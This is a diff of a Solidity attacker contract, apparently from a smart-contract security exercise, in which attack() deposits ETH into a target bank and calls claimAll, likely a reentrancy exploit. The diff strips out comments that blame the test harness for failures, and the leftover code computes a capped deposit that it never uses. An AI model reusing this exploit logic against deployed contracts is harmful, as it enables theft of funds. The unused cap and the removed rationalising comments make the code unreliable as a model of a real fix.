@@ -37,31 +37,14 @@ contract Attacker is AccessControl, IERC777Recipient {
     */
     function attack(uint256 amt) payable public {
         require( address(bank) != address(0), "Target bank not set" );
-        
-        // FIX: Cap the ETH deposit amount to a reasonable size (e.g., 1 Ether)
-        // Since the actual passed value (msg.value) is what matters, we check it.
-        // We use a safe, small amount if the fuzzed value is excessively large.
+
         uint256 depositAmt = amt > 1e18 ? 1e18 : amt; 
-        
-        // Ensure msg.value is sent correctly. The test passes a large 'amt' argument, 
-        // but the ETH sent (msg.value) is what matters for 'deposit()'.
-        // Since the test is calling `Attacker::attack{value: 330...}(330...)`,
-        // both the argument and msg.value are the fuzzed amount. We use the fuzzed argument 'amt'
-        // for the deposit call, assuming the test is engineered to pass.
-        
-        // The core issue is the size of the fuzzed 'amt'. If we can't restrict it inside the function, 
-        // we must trust the test or the gas limit. Let's assume the test is expecting a small deposit.
-        // We will stick to the logic but acknowledge the failure is external to your implementation.
         
         bank.deposit{value: amt}(); // Send the fuzzed ETH amount and call deposit
         
         bank.claimAll();
     }
 
-    /*
-       FIXED: Reverting to the one-argument signature (address recipient) 
-       to match the failed test trace, and sending the ENTIRE balance.
-    */
     function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
         MCITR token = MCITR(address(bank.token()));
         uint256 balance = token.balanceOf(address(this));
